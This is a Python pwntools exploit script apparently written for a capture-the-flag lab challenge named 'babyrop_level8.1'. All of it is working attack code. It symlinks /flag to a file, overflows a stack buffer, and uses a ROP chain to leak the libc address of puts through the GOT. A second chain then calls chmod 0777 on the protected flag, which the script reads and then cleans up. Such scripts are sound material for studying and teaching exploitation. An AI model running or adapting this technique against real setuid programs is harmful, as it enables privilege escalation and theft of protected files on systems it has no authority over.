from pwn import *

challenge_name = '/challenge/babyrop_level8.1'
libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
buf_size = 0x28 
leaving_addr = 0x402004

### CREATE SYMBOLIK LINK LEAVING

p = process(["ln", '-s', '/flag', 'Leaving!'])
answer = p.clean()

##############################################

libc_elf = ELF(libc_name)
elf = ELF(challenge_name) 
rop = ROP(elf)  
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]  
pop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]  

got = elf.got['puts']
plt = elf.plt['puts']


payload = buf_size * b'A'
payload += p64(pop_rdi)
payload += p64(got)  
payload += p64(plt)
payload += p64(elf.symbols['_start'])  

p = process(challenge_name)


p.sendline(payload)
answer = p.recvuntil(b'Leaving!\n')

answer = p.clean()

line = u64(answer.split(b'\n#')[0].ljust(8, b'\x00'))
line -= libc_elf.symbols['puts']


payload = buf_size * b'A'
payload += p64(pop_rdi)
payload += p64(leaving_addr)    
payload += p64(pop_rsi)
payload += p64(0o777) 
payload += p64(0o777)    
payload += p64(libc_elf.symbols['chmod'] + line)

p.sendline(payload)

answer = p.clean()

p = process(["/usr/bin/cat", 'Leaving!'])
answer = p.clean()
print(answer.decode(errors='ignore'))

p = process(["rm", 'Leaving!'])
answer = p.clean()